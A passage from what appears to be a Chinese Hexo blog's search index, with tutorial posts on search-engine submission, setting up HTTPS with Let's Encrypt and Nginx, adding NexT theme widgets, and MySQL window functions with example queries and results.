准入秘钥 path: baidu_urls.txt ## 文本文档的地址， 新链接会保存在此文本文档里准入秘钥可以在链接提交-自动提交-主动推送（实时）中查看。然后我们需要保证站点_config.yml文件中url的值是百度站长平台注册的域名， 比如:123# URL## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'url: https://tding.top/最后，加入新的deployer-baidu_url_submitter:123456789# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy:- type: git repository: git@github.com:dta0502/dta0502.github.io.git branch: master # other deployer- type: leancloud_counter_security_sync- type: baidu_url_submitter自动推送修改主题配置文件把baidu_push设置为true。1baidu_push: true然后就会将一下代码自动推送到百度，位置是themes\next\layout_scripts\baidu_push.swig,这样每次访问博客中的页面就会自动向百度提交sitemap。12345678910111213141516&#123;% if theme.baidu_push %&#125;&lt;script&gt;(function()&#123; var bp = document.createElement('script'); var curProtocol = window.location.protocol.split(':')[0]; if (curProtocol === 'https') &#123; bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'; &#125; else &#123; bp.src = 'http://push.zhanzhang.baidu.com/push.js'; &#125; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(bp, s);&#125;)();&lt;/script&gt;&#123;% endif %&#125;sitemap提交首先访问之前生成的sitemap文件测试是否成功：https://tding.top/baidusitemap.xml然后我们可以在链接提交-自动提交-sitemap提交中进行站点地图的提交。输入验证码后提交即可，一般情况下，百度会在一小时内处理该文件，并提取其中的url。部署Hexo到VPS并且开启HTTPS由于百度蜘蛛采集链接信息之前需要访问 baidusitemap.xml 文件，而这个文件是在 GitHub Pages 里面的，但是 GitHub Pages 是禁止百度蜘蛛爬取的，所以百度蜘蛛在获取 baidusitemap.xml 文件这一步骤就被禁止了，GitHub Pages 返回 403 错误，因此抓取失败（哪怕获取到 baidusitemap.xml 文件也不行，因为后续需要采集的静态网页全部是放在 GitHub Pages 中的，全部都会被禁止）。我们可以通过百度站长的抓取诊断来验证是否出现以上情况：这里基本可以确定 GitHub Pages 拒绝了百度 Spider 的爬取请求。下面是GitHub的一个回复：I’ve confirmed that we are currently blocking the Baidu user agent from crawling GitHub Pages sites. We took this action in response to this user agent being responsible for an excessive amount of requests, which was causing availability issues for other GitHub customers. This is unlikely to change any time soon, so if you need the Baidu user agent to be able to crawl your site you will need to host it elsewhere.因此我需要把Hexo部署到自己的VPS上，具体的部署过程见：Hexo 博客部署到 VPS。为了能够部署到VPS，那就需要绑定一个个性域名，具体过程见GitHub Pages绑定域名。然后再把Hexo升级HTTPS，具体步骤见：Hexo升级HTTPS同时由于我们知道了百度爬虫的用户代理，那么就可以直接使用 curl 命令来模拟百度爬虫的请求，观察返回的 http 结果是否正常：1curl -A "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" https://tding.top/baidusitemap.xml结果看出模拟请求的结果是正常的。搜狗站长平台文件路径：~\themes\next\layout\_partials\head\head.swig，添加以下代码：12345678910111213141516171819&#123;% if theme.google_site_verification %&#125; &lt;meta name="google-site-verification" content="&#123;&#123; theme.google_site_verification &#125;&#125;"/&gt;&#123;% endif %&#125;&#123;% if theme.bing_site_verification %&#125; &lt;meta name="msvalidate.01" content="&#123;&#123; theme.bing_site_verification &#125;&#125;"/&gt;&#123;% endif %&#125;&#123;% if theme.yandex_site_verification %&#125; &lt;meta name="yandex-verification" content="&#123;&#123; theme.yandex_site_verification &#125;&#125;"/&gt;&#123;% endif %&#125;&#123;% if theme.baidu_site_verification %&#125; &lt;meta name="baidu-site-verification" content="&#123;&#123; theme.baidu_site_verification &#125;&#125;"/&gt;&#123;% endif %&#125;+&#123;% if theme.sogou_site_verification %&#125;+ &lt;meta name="sogou_site_verification" content="&#123;&#123; theme.sogou_site_verification &#125;&#125;"/&gt;+&#123;% endif %&#125;主题配置文件_config.yml添加：12+# Sougou Webmaster tools verification.+sogou_site_verification: YXFDrGSL8d360搜索站长平台文件路径：~\themes\next\layout\_partials\head\head.swig，添加以下代码：1234567891011121314151617181920212223&#123;% if theme.google_site_verification %&#125; &lt;meta name="google-site-verification" content="&#123;&#123; theme.google_site_verification &#125;&#125;"/&gt;&#123;% endif %&#125;&#123;% if theme.bing_site_verification %&#125; &lt;meta name="msvalidate.01" content="&#123;&#123; theme.bing_site_verification &#125;&#125;"/&gt;&#123;% endif %&#125;&#123;% if theme.yandex_site_verification %&#125; &lt;meta name="yandex-verification" content="&#123;&#123; theme.yandex_site_verification &#125;&#125;"/&gt;&#123;% endif %&#125;&#123;% if theme.baidu_site_verification %&#125; &lt;meta name="baidu-site-verification" content="&#123;&#123; theme.baidu_site_verification &#125;&#125;"/&gt;&#123;% endif %&#125;&#123;% if theme.sogou_site_verification %&#125; &lt;meta name="sogou_site_verification" content="&#123;&#123; theme.sogou_site_verification &#125;&#125;"/&gt;&#123;% endif %&#125;+&#123;% if theme.so_site_verification %&#125;+ &lt;meta name="360-site-verification" content="&#123;&#123; theme.so_site_verification &#125;&#125;"/&gt;+&#123;% endif %&#125;主题配置文件_config.yml添加：12+# 360 Webmaster tools verification.+so_site_verification: b2195ba72e4870178be78acf3163b3ce神马站长平台文件路径：~\themes\next\layout\_partials\head\head.swig，添加以下代码：123456789101112131415161718192021222324252627&#123;% if theme.google_site_verification %&#125; &lt;meta name="google-site-verification" content="&#123;&#123; theme.google_site_verification &#125;&#125;"/&gt;&#123;% endif %&#125;&#123;% if theme.bing_site_verification %&#125; &lt;meta name="msvalidate.01" content="&#123;&#123; theme.bing_site_verification &#125;&#125;"/&gt;&#123;% endif %&#125;&#123;% if theme.yandex_site_verification %&#125; &lt;meta name="yandex-verification" content="&#123;&#123; theme.yandex_site_verification &#125;&#125;"/&gt;&#123;% endif %&#125;&#123;% if theme.baidu_site_verification %&#125; &lt;meta name="baidu-site-verification" content="&#123;&#123; theme.baidu_site_verification &#125;&#125;"/&gt;&#123;% endif %&#125;&#123;% if theme.sogou_site_verification %&#125; &lt;meta name="sogou_site_verification" content="&#123;&#123; theme.sogou_site_verification &#125;&#125;"/&gt;&#123;% endif %&#125;&#123;% if theme.so_site_verification %&#125; &lt;meta name="360-site-verification" content="&#123;&#123; theme.so_site_verification &#125;&#125;"/&gt;&#123;% endif %&#125;+&#123;% if theme.shenma_site_verification %&#125;+ &lt;meta name="shenma-site-verification" content="&#123;&#123; theme.shenma_site_verification &#125;&#125;"/&gt;+&#123;% endif %&#125;主题配置文件_config.yml添加：12+# shenma Webmaster tools verification.+shenma_site_verification: 0febefc87224a8e180455c8bfbf8044a_1566192856]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NexT</tag>
        <tag>SEO</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo升级HTTPS]]></title>
    <url>%2Farchives%2F21caa4d0.html</url>
    <content type="text"><![CDATA[本文主要介绍如何设置Hexo支持https访问以及遇到的相关问题说明。准备工作DNSPOD中添加VPS IP的解析：1@ A 默认 VPSIP然后暂停其中的GitHub的IP地址的解析。获取免费证书为了鼓励https的普及，EFF成立了免费证书最大的提供商为Let’s Encrypt，可以提供免费证书。那么小型的网站，就可以使用免费证书升级为https啦。当然Let’s Encrypt生成的证书，只能是单域名的，而且只有最低级的域名验证。克隆letsencrypt客户端1git clone https://github.com/letsencrypt/letsencrypt /opt/letsencrypt如果遇到权限问题，记得先创建/opt/letsencrypt文件夹再更改文件夹权限为可写入。注册证书-Nginx指向静态路径注册一个域名证书非常简单,使用letsencrypt就能生成https所需的证书。当然，用letsencrypt生成的证书只支持域名验证，只需要用letsenctypt的自动注册证书命令，证明这个域名是自己的是用的即可。12cd /opt/letsencrypt./letsencrypt-auto certonly -a webroot --webroot-path=/var/www/blog -d tding.top后续将会让你继续输入邮箱信息。然后出现了如下错误：12345678910111213141516171819202122232425262728Saving debug log to /var/log/letsencrypt/letsencrypt.logPlugins selected: Authenticator webroot, Installer NoneObtaining a new certificatePerforming the following challenges:http-01 challenge for tding.topUsing the webroot path /var/www/blog for all unmatched domains.Waiting for verification...Challenge failed for domain tding.tophttp-01 challenge for tding.topCleaning up challengesSome challenges have failed.IMPORTANT NOTES: - The following errors were reported by the server: Domain: tding.top Type: connection Detail: Fetching http://tding.top/.well-known/acme-challenge/-OO3Ftn96u4kKPKKUkyFHxa6ntdZioOfEF-x5_CwKpY: Connection refused To fix these errors, please make sure that your domain name was entered correctly and the DNS A/AAAA record(s) for that domain contain(s) the right IP address. Additionally, please check that your computer has a publicly routable IP address and that no firewalls are preventing the server from communicating with the client. If you&apos;re using the webroot plugin, you should also verify that you are serving files from the webroot path you provided.这个问题的解决办法：配置nginx，启动nginx，保证能够正常访问nginx，如果跟换了域名，需要将原来https配置都先注释掉，先保证能够通过http正常访问nginx服务。然后再次运行注册证书代码成功：12345678910111213141516171819202122Saving debug log to /var/log/letsencrypt/letsencrypt.logPlugins selected: Authenticator webroot, Installer NoneObtaining a new certificatePerforming the following challenges:http-01 challenge for tding.topUsing the webroot path /var/www/blog for all unmatched domains.Waiting for verification...Cleaning up challengesIMPORTANT NOTES: - Congratulations! Your certificate and chain have been saved at: /etc/letsencrypt/live/tding.top/fullchain.pem Your key file has been saved at: /etc/letsencrypt/live/tding.top/privkey.pem Your cert will expire on 2019-11-18. To obtain a new or tweaked version of this certificate in the future, simply run letsencrypt-auto again. To non-interactively renew *all* of your certificates, run &quot;letsencrypt-auto renew&quot; - If you like Certbot, please consider supporting our work by: Donating to ISRG / Let&apos;s Encrypt: https://letsencrypt.org/donate Donating to EFF: https://eff.org/donate-leNginx配置-指向静态文件直到这一步，证书已经就绪，只要配置好Nginx即可完美升级https。Nginx配置各有各的配置方法，这里只要保证四点：域名配置正确静态文件目录路径、本地服务目录路径配置正确.well-known/acme-challenge目录配置正确要保证80默认端口和443ssl端口都有配置下面是一个Nginx配置例子：12345678910111213141516171819202122232425server &#123; listen 80; server_name tding.top; # 这里写你的域名 location ^~ /.well-known/acme-challenge/ &#123; default_type &quot;text/plain&quot;; root /var/www/blog; # 这里写你的静态文件目录 &#125; location = /.well-known/acme-challenge/ &#123; return 404; &#125; return 301 https://$server_name$request_uri;&#125;server &#123; # SSL Configuration listen 443 ssl; server_name tding.top; # 这里写你的域名 # specify cert files ssl_certificate /etc/letsencrypt/live/tding.top/fullchain.pem; # 中间写你的域名 ssl_certificate_key /etc/letsencrypt/live/tding.top/privkey.pem; # 中间写你的域名 location / &#123; root /var/www/blog; # 这里写你的静态文件目录 index index.html index.htm; # 这里写你暴露的静态文件 &#125;&#125;自动更新证书letsencrypt证书最多只有90天，90天之后我们需要重新注册证书，当然这个可以交给服务器自己做啦。验证自己的证书是否可以更新12cd /opt/letsencrypt./letsencrypt-auto renew --dry-run此命令只是验证，不会更新证书。如果出现Congratulations!字样或者已经更新字样则证明可以自动更新。如果出现错误，或者说路径找不到的情况，大多数情况是.well-known/acme-challenge目录配置没有正确的配置成功。编写crontab脚本1crontab -e脚本内容130 2 * * 1 /opt/letsencrypt/letsencrypt-auto renew &gt;&gt; /var/log/le-renew.log如果遇到权限问题，可先创建/var/log目录再设置其权限为可写入。参考升级你的hexo为https]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo-NexT添加第三方服务]]></title>
    <url>%2Farchives%2F7696c13f.html</url>
    <content type="text"><![CDATA[本文主要记录了Hexo-NexT博客添加第三方服务的过程，其中包括添加AddThis分享功能、添加网页音乐播放器、添加在线聊天、添加文章评分功能、支持ECharts动态图表。添加AddThis分享功能AddThis官网配置账号注册首先点击AddThis至官网注册账号，然后国家可以选择China。选择工具类型(Select a Tool)这里我选择分享按钮（Share Button）。选择显示样式(Select a Tool Type)AddThis提供了7种显示样式，你可以在左边菜单栏点击,右边会自动显示你选择的相应样式。右上角可以切换PC和Phone显示。分享设计界面选择Continue之后进入分享样式设计界面。第一个设置你要显示的主要应用第二个设置在手机上的显示样式和大小第三个设置分享计数器针对个人等选项第四个设置分享组合的位置，宽度，偏移量第五个设置该分享是否要显示在主页上等配置代码视图设置完成后进入该页面选择仅代码视图打开，可以看到生成的代码，从而获取主题配置文件所需add_this_id也就是当前页面的pubid。配置主题文件在主题配置文件_config.yml文件add_this_id配置官网中获得的pubid。添加网页音乐播放器下载访问Aplayer网站：GitHub Aplayer。下载源码到本地，解压后将dist文件夹复制到themes\next\source文件夹下。添加music.js新建themes\next\source\dist\music.js文件，添加内容：12345678910111213141516171819const ap = new APlayer(&#123; container: document.getElementById('aplayer'), fixed: true, autoplay: false, audio: [ &#123; name: "灰色头像", artist: '许嵩', url: 'http://www.ytmp3.cn/down/59697.mp3', cover: 'http://img.ytmp3.cn/image/79.jpg', &#125;, &#123; name: '多余的解释', artist: '许嵩', url: 'http://www.ytmp3.cn/down/60447.mp3', cover: 'http://img.ytmp3.cn/image/78.jpg', &#125; ]&#125;);audio对应的便是音频文件，音乐播放器需要播放的音乐信息需要自己添加（如歌曲链接、歌词、封面等）的配置。这里放一个mp3音乐外链网站：http://up.mcyt.net/ ，搜索对应的音乐，然后复制url和右击封面图片链接粘贴到对应的位置上就行了。配置_layout.swig打开themes\next\layout\_layout.swig文件，将1234&lt;link rel="stylesheet" href="/dist/APlayer.min.css"&gt;&lt;div id="aplayer"&gt;&lt;/div&gt;&lt;script type="text/javascript" src="/dist/APlayer.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="/dist/music.js"&gt;&lt;/script&gt;添加到&lt;body itemscope ...&gt;后面，即在&lt;body&gt;&lt;/body&gt;里面。然后我们就能看到左下角的音乐播放器了。添加在线聊天在线聊天算是一个比较成熟的 SaaS 商业应用了，业内产品如 Tidio、 TalkJS、Intercom、tawk.to 等，使用体验都很好，交互界面也很干净别致。经过比较，本站最终选择了 Tidio：在个人博客这种业务场景中，几乎用不到它的收费功能，可以算是终身免费了。Tidio 提供了多种消息回复渠道，包括网页、桌面应用、iOS/Android APP（需要 Google play 服务支持）。除了在线聊天，Tidio 还可以在线发送邮件，以及关联接收 Fackbook 消息。首先需要注册 Tidio 账号，根据引导填写应用信息。进入控制台后，在 SETTINGS -&gt; Developer -&gt; Project data 中获取到 Public Key：在主题配置文件下配置如下代码：12345678910chat: enable: true #service: chatra service: tidio icon: comment # icon in Font Awesome 4, set false to disable icon text: Chat # button text, change it as you wishtidio: enable: true key: 你的key # Public Key, get it from Dashboard, See: https://www.tidiochat.com/panel/settings/developer刷新页面即可在右下角看到 Tidio 的会话标志了。接下来可以在 Tidio 控制台的 Channel -&gt; Live chat -&gt; Appearance 中根据提示定制聊天对话框的主题外观和语言包：添加文章评分功能修改主题配置文件_config.yml，修改为：123456# Star rating support to each article.# To get your ID visit https://widgetpack.comrating: enable: true id: color: f79533再打开 https://widgetpack.com ，首页点 Rating, 注册一个账号，完成后左上角有一个 ID，填入即可。可以配置评分方式，侧栏 &gt; Rating &gt; Setting，建议用 IP address 或 Device (cookie)，免登录建议 侧栏 &gt; Site &gt; Setting 中勾选 Private 选项。支持ECharts动态图表ECharts，一个纯 Javascript 的图表库，可以流畅的运行在 PC 和移动设备上，兼容当前绝大部分浏览器（IE8/9/10/11，Chrome，Firefox，Safari 等）。插件的安装Hexo 的 ECharts 插件是博主 KChen 根据周旅军的原型插件开发的。进入博客根目录安装插件：1npm install hexo-tag-echarts --save插件的使用在文章中使用 ECharts 时，格式为：123&#123;% echarts 400 &apos;85%&apos; %&#125;\\TODO option goes here&#123;% endecharts %&#125;其中echarts是标签名，不需要更改，400是图表容器的高度，85%是图表容器的相对宽度。而在tag之间的部分，则是需要自己填充的图表数据了。比如，在文章中输入以下内容：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&#123;% echarts 400 '85%' %&#125;&#123; title: &#123; text: "某站点用户访问来源", subtext: "ECharts示例", x: "center" &#125;, tooltip: &#123; trigger: "item", formatter: "&#123;a&#125; &lt;br/&gt;&#123;b&#125; : &#123;c&#125; (&#123;d&#125;%)" &#125;, legend: &#123; orient: "vertical", x: "left", data: ["直接访问", "邮件营销", "联盟广告", "视频广告", "搜索引擎"] &#125;, toolbox: &#123; show: true, feature: &#123; mark: &#123; show: true &#125;, dataView: &#123; show: true, readOnly: true &#125;, restore: &#123; show: true &#125;, saveAsImage: &#123; show: true &#125; &#125; &#125;, calculable: true, series: [ &#123; name: "访问来源", type: "pie", radius: "55%", center: ["50%", "60%"], data: [ &#123; value: 335, name: "直接访问" &#125;, &#123; value: 310, name: "邮件营销" &#125;, &#123; value: 234, name: "联盟广告" &#125;, &#123; value: 135, name: "视频广告" &#125;, &#123; value: 1548, name: "搜索引擎" &#125; ] &#125; ]&#125;&#123;% endecharts %&#125;上述代码渲染出来的 ECharts 图表如下：var myChart=echarts.init(document.getElementById("echarts2789")),option={title:{text:"某站点用户访问来源",subtext:"ECharts示例",x:"center"},tooltip:{trigger:"item",formatter:"{a} {b} : {c} ({d}%)"},legend:{orient:"vertical",x:"left",data:["直接访问","邮件营销","联盟广告","视频广告","搜索引擎"]},toolbox:{show:!0,feature:{mark:{show:!0},dataView:{show:!0,readOnly:!0},restore:{show:!0},saveAsImage:{show:!0}}},calculable:!0,series:[{name:"访问来源",type:"pie",radius:"55%",center:["50%","60%"],data:[{value:335,name:"直接访问"},{value:310,name:"邮件营销"},{value:234,name:"联盟广告"},{value:135,name:"视频广告"},{value:1548,name:"搜索引擎"}]}]};myChart.setOption(option)如果按照上例不能正确绘制图表，请照下面的指导修改一下 ECharts 的模板文件。用编辑器打开博客目录下 ~/node_modules/hexo-tag-echarts/echarts-template.html 文件。作如下修改：12345&lt;div id="&lt;%- id %&gt;" style="width: &lt;%- width %&gt;;height: &lt;%- height %&gt;px;margin: 0 auto"&gt;&lt;/div&gt;+ &lt;script src="https://echarts.baidu.com/dist/echarts.common.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;...&lt;/script&gt;参考Hexo搭建博客NexT主题之AddThis分享文章的配置Hexo-NexT 主题：文章内容美化]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NexT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL窗口函数]]></title>
    <url>%2Farchives%2Fc6e31643.html</url>
    <content type="text"><![CDATA[MySQL从8.0开始支持窗口函数，这个功能在大多商业数据库和部分开源数据库中早已支持，有的也叫分析函数。窗口函数简介什么叫窗口?窗口的概念非常重要，它可以理解为记录集合，窗口函数也就是在满足某种条件的记录集合上执行的特殊函数。对于每条记录都要在此窗口内执行函数，有的函数随着记录不同，窗口大小都是固定的，这种属于静态窗口；有的函数则相反，不同的记录对应着不同的窗口，这种动态变化的窗口叫滑动窗口。窗口函数和普通聚合函数的区别窗口函数和普通聚合函数也很容易混淆，二者区别如下：聚合函数是将多条记录聚合为一条；而窗口函数是每条记录都会执行，有几条记录执行完还是几条。聚合函数也可以用于窗口函数中。窗口函数的类别按照功能划分，可以把MySQL支持的窗口函数分为如下几类：序号函数：row_number() / rank() / dense_rank()分布函数：percent_rank() / cume_dist()前后函数：lag() / lead()头尾函数：first_val() / last_val()其他函数：nth_value() / nfile()窗口函数基本用法1函数名([expr]) over子句其中，over是关键字，用来指定函数执行的窗口范围，如果后面括号中什么都不写，则意味着窗口包含满足where条件的所有行，窗口函数基于所有行进行计算；如果不为空，则支持以下四种语法来设置窗口：window_name：给窗口指定一个别名，如果SQL中涉及的窗口较多，采用别名可以看起来更清晰易读。如果指定一个别名w，则改写如下：12345678select * from( select row_number()over w as row_num, order_id,user_no,amount,create_date from order_info WINDOW w AS (partition by user_no order by amount desc)) as t;partition子句：窗口按照那些字段进行分组，窗口函数在不同的分组上分别执行。上面的例子就按照用户id进行了分组。在每个用户id上，按照order by的顺序分别生成从1开始的顺序编号。order by子句：按照哪些字段进行排序，窗口函数将按照排序后的记录顺序进行编号。可以和partition子句配合使用，也可以单独使用。上例中二者同时使用，如果没有partition子句，则会按照所有用户的订单金额排序来生成序号。frame子句：frame是当前分区的一个子集，子句用来定义子集的规则，通常用来作为滑动窗口使用。比如要根据每个订单动态计算包括本订单和按时间顺序前后两个订单的平均订单金额，则可以设置如下frame子句来创建滑动窗口：12345678910select * from( select order_id,user_no,amount, avg(amount)over w as avg_num, create_date from order_info WINDOW w AS (partition by user_no order by create_date desc ROWS BETWEEN 1 PRECEDING AND 1 FOLLOWING)) as t;1234567891011121314+----------+---------+--------+----------+---------------------+| order_id | user_no | amount | avg_num | create_date |+----------+---------+--------+----------+---------------------+| 5 | u0001 | 900 | 850.0000 | 2018-01-20 00:00:00 || 4 | u0001 | 800 | 666.6667 | 2018-01-10 00:00:00 || 2 | u0001 | 300 | 466.6667 | 2018-01-02 00:00:00 || 3 | u0001 | 300 | 233.3333 | 2018-01-02 00:00:00 || 1 | u0001 | 100 | 200.0000 | 2018-01-01 00:00:00 || 10 | u0002 | 800 | 800.0000 | 2018-01-22 00:00:00 || 9 | u0002 | 800 | 633.3333 | 2018-01-16 00:00:00 || 8 | u0002 | 300 | 566.6667 | 2018-01-10 00:00:00 || 7 | u0002 | 600 | 466.6667 | 2018-01-06 00:00:00 || 6 | u0002 | 500 | 550.0000 | 2018-01-05 00:00:00 |+----------+---------+--------+----------+---------------------+从结果可以看出，order_id为5订单属于边界值，没有前一行，因此平均订单金额为(900+800)/2=850；order_id为4的订单前后都有订单，所以平均订单金额为（900+800+300）/3=666.6667，以此类推可以得到一个基于滑动窗口的动态平均订单值。此例中，窗口函数用到了传统的聚合函数avg()，用来计算动态的平均值。对于滑动窗口的范围指定，有两种方式，基于行和基于范围，具体区别如下：基于行：通常使用BETWEEN frame_start AND frame_end语法来表示行范围，frame_start和frame_end可以支持如下关键字，来确定不同的动态行记录：CURRENT ROW 边界是当前行，一般和其他范围关键字一起使用UNBOUNDED PRECEDING 边界是分区中的第一行UNBOUNDED FOLLOWING 边界是分区中的最后一行expr PRECEDING 边界是当前行减去expr的值expr FOLLOWING 边界是当前行加上expr的值比如，下面都是合法的范围：rows BETWEEN 1 PRECEDING AND 1 FOLLOWING 窗口范围是当前行、前一行、后一行一共三行记录。rows UNBOUNDED FOLLOWING 窗口范围是当前行到分区中的最后一行。rows BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING 窗口范围是当前分区中所有行，等同于不写。基于范围：和基于行类似，但有些范围不是直接可以用行数来表示的，比如希望窗口范围是一周前的订单开始，截止到当前行，则无法使用rows来直接表示，此时就可以使用范围来表示窗口：INTERVAL 7 DAY PRECEDING。Linux中常见的最近1分钟、5分钟负载是一个典型的应用场景。测试数据12345678910111213141516171819create table order_info( order_id int primary key, user_no varchar(10), amount int, create_date datetime);insert into order_info values (1,'u0001',100,'2018-1-1');insert into order_info values (2,'u0001',300,'2018-1-2');insert into order_info values (3,'u0001',300,'2018-1-2');insert into order_info values (4,'u0001',800,'2018-1-10');insert into order_info values (5,'u0001',900,'2018-1-20');insert into order_info values (6,'u0002',500,'2018-1-5');insert into order_info values (7,'u0002',600,'2018-1-6');insert into order_info values (8,'u0002',300,'2018-1-10');insert into order_info values (9,'u0002',800,'2018-1-16');insert into order_info values (10,'u0002',800,'2018-1-22');窗口函数使用实例序号函数row_number()应用场景：求每个用户的最新的一个订单。思路：使用row_number() over(partition by user_no order by create_date desc) as row_num给原始记录编一个号，然后取第一个编号的数据，自然就是“用户的最新的一条订单”。1234567select * from ( select row_number() over(partition by user_no order by create_date desc) as row_num,order_id,user_no,amount,create_date from order_info) as t where row_num=1;123456+---------+----------+---------+--------+---------------------+| row_num | order_id | user_no | amount | create_date |+---------+----------+---------+--------+---------------------+| 1 | 5 | u0001 | 900 | 2018-01-20 00:00:00 || 1 | 10 | u0002 | 800 | 2018-01-22 00:00:00 |+---------+----------+---------+--------+---------------------+row_number()：(分组)排序编号。正如上面的例子， row_number()over(partition by user_no order by create_date desc) as row_num，按照用户分组，按照create_date排序，对已有数据生成一个编号。当然也可以不分组，对整体进行排序。任何一个窗口函数，都可以分组统计或者不分组统计（也即可以不要partition by ***都可以，看你的需求了）。rank()类似于 row_number()，也是排序功能，但是rank()有什么不一样？如果再往测试表中写入一条数据：insert into order_info values (11,&#39;u0002&#39;,800,&#39;2018-1-22&#39;);对于测试表中的U002用户来说，有两条create_date完全一样的数据（假设有这样的数据），那么在row_number()编号的时候，这两条数据却被编了两个不同的号。理论上讲，这两条的数据的排名是并列最新的。因此rank()就是为了解决这个问题的，也即：排序条件一样的情况下，其编号也一样。123456select * from ( select rank() over(partition by user_no order by create_date desc) as row_num,order_id,user_no,amount,create_date from order_info) as t;1234567891011121314+---------+----------+---------+--------+---------------------+| row_num | order_id | user_no | amount | create_date |+---------+----------+---------+--------+---------------------+| 1 | 5 | u0001 | 900 | 2018-01-20 00:00:00 || 2 | 4 | u0001 | 800 | 2018-01-10 00:00:00 || 3 | 2 | u0001 | 300 | 2018-01-02 00:00:00 || 3 | 3 | u0001 | 300 | 2018-01-02 00:00:00 || 5 | 1 | u0001 | 100 | 2018-01-01 00:00:00 || 1 | 10 | u0002 | 800 | 2018-01-22 00:00:00 || 2 | 9 | u0002 | 800 | 2018-01-16 00:00:00 || 3 | 8 | u0002 | 300 | 2018-01-10 00:00:00 || 4 | 7 | u0002 | 600 | 2018-01-06 00:00:00 || 5 | 6 | u0002 | 500 | 2018-01-05 00:00:00 |+---------+----------+---------+--------+---------------------+dense_rank()dense_rank()的出现是为了解决rank()编号存在的问题的，rank()编号的时候存在跳号的问题，如果有两个并列第1，那么下一个名次的编号就是3，结果就是没有编号为2的数据。如果不想跳号，可以使用dense_rank()替代。123456select * from ( select dense_rank() over(partition by user_no order by create_date desc) as row_num,order_id,user_no,amount,create_date from order_info) as t;1234567891011121314+---------+----------+---------+--------+---------------------+| row_num | order_id | user_no | amount | create_date |+---------+----------+---------+--------+---------------------+| 1 | 5 | u0001 | 900 | 2018-01-20 00:00:00 || 2 | 4 | u0001 | 800 | 2018-01-10 00:00:00 || 3 | 2 | u0001 | 300 | 2018-01-02 00:00:00 || 3 | 3 | u0001 | 300 | 2018-01-02 00:00:00 || 4 | 1 | u0001 | 100 | 2018-01-01 00:00:00 || 1 | 10 | u0002 | 800 | 2018-01-22 00:00:00 || 2 | 9 | u0002 | 800 | 2018-01-16 00:00:00 || 3 | 8 | u0002 | 300 | 2018-01-10 00:00:00 || 4 | 7 | u0002 | 600 | 2018-01-06 00:00:00 || 5 | 6 | u0002 | 500 | 2018-01-05 00:00:00 |+---------+----------+---------+--------+---------------------+分布函数cume_dist()用途：分组内大于等于当前rank值的行数/分组内总行数。应用场景：大于等于当前订单金额的订单比例有多少。123456select rank() over w as row_num,cume_dist() over w as percent,order_id,user_no,amount,create_datefrom order_infowindow w as (partition by user_no order by amount desc);1234567891011121314+---------+---------+----------+---------+--------+---------------------+| row_num | percent | order_id | user_no | amount | create_date |+---------+---------+----------+---------+--------+---------------------+| 1 | 0.2 | 5 | u0001 | 900 | 2018-01-20 00:00:00 || 2 | 0.4 | 4 | u0001 | 800 | 2018-01-10 00:00:00 || 3 | 0.8 | 2 | u0001 | 300 | 2018-01-02 00:00:00 || 3 | 0.8 | 3 | u0001 | 300 | 2018-01-02 00:00:00 || 5 | 1 | 1 | u0001 | 100 | 2018-01-01 00:00:00 || 1 | 0.4 | 9 | u0002 | 800 | 2018-01-16 00:00:00 || 1 | 0.4 | 10 | u0002 | 800 | 2018-01-22 00:00:00 || 3 | 0.6 | 7 | u0002 | 600 | 2018-01-06 00:00:00 || 4 | 0.8 | 6 | u0002 | 500 | 2018-01-05 00:00:00 || 5 | 1 | 8 | u0002 | 300 | 2018-01-10 00:00:00 |+---------+---------+----------+---------+--------+---------------------+聚合函数avg()、sum()、max()、min()我们可以在聚合函数中使用窗口功能，比如sum(amount)over(partition by user_no order by create_date) as sum_amont，达到一个累积计算sum的功能。这种需求在没有窗口函数的情况下，用纯sql写起来很麻烦。应用场景：每个用户按照订单id，截止到当前的累计订单金额/平均订单金额/最大订单金额/最小订单金额/订单数是多少？12345678select order_id,user_no,amount,create_date,sum(amount) over w as sum_amount,avg(amount) over w as avg_amount,max(amount) over w as max_amount,min(amount) over w as min_amountfrom order_infowindow w as (partition by user_no order by create_date desc);1234567891011121314+----------+---------+--------+---------------------+------------+------------+------------+------------+| order_id | user_no | amount | create_date | sum_amount | avg_amount | max_amount | min_amount |+----------+---------+--------+---------------------+------------+------------+------------+------------+| 5 | u0001 | 900 | 2018-01-20 00:00:00 | 900 | 900.0000 | 900 | 900 || 4 | u0001 | 800 | 2018-01-10 00:00:00 | 1700 | 850.0000 | 900 | 800 || 2 | u0001 | 300 | 2018-01-02 00:00:00 | 2300 | 575.0000 | 900 | 300 || 3 | u0001 | 300 | 2018-01-02 00:00:00 | 2300 | 575.0000 | 900 | 300 || 1 | u0001 | 100 | 2018-01-01 00:00:00 | 2400 | 480.0000 | 900 | 100 || 10 | u0002 | 800 | 2018-01-22 00:00:00 | 800 | 800.0000 | 800 | 800 || 9 | u0002 | 800 | 2018-01-16 00:00:00 | 1600 | 800.0000 | 800 | 800 || 8 | u0002 | 300 | 2018-01-10 00:00:00 | 1900 | 633.3333 | 800 | 300 || 7 | u0002 | 600 | 2018-01-06 00:00:00 | 2500 | 625.0000 | 800 | 300 || 6 | u0002 | 500 | 2018-01-05 00:00:00 | 3000 | 600.0000 | 800 | 300 